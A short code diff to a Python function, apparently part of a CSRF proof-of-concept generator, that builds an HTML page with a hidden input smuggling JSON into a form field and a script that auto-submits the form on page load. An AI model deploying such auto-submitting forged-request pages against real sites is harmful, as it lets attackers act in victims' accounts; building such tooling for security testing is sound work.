@@ -20,12 +20,13 @@ def generate_html_form(method, full_url, headers, parsed_body):
                 <input name='{parsed_body}, "ignore_me":"' value='test"\u007d'type='hidden' />"""
 
     html_content += f"""
-                <input type="submit" value="Submit request" />
-            </form>
-            <script>
-                history.pushState('', '', '/');
-                document.forms[0].submit();
-            </script>
+            <input type="submit" value="Submit request" />
+        </form>
+        <script>
+            window.addEventListener('load', function () {{
+                document.querySelector('form').submit();
+            }});
+        </script>
         </body>
     </html>"""
 
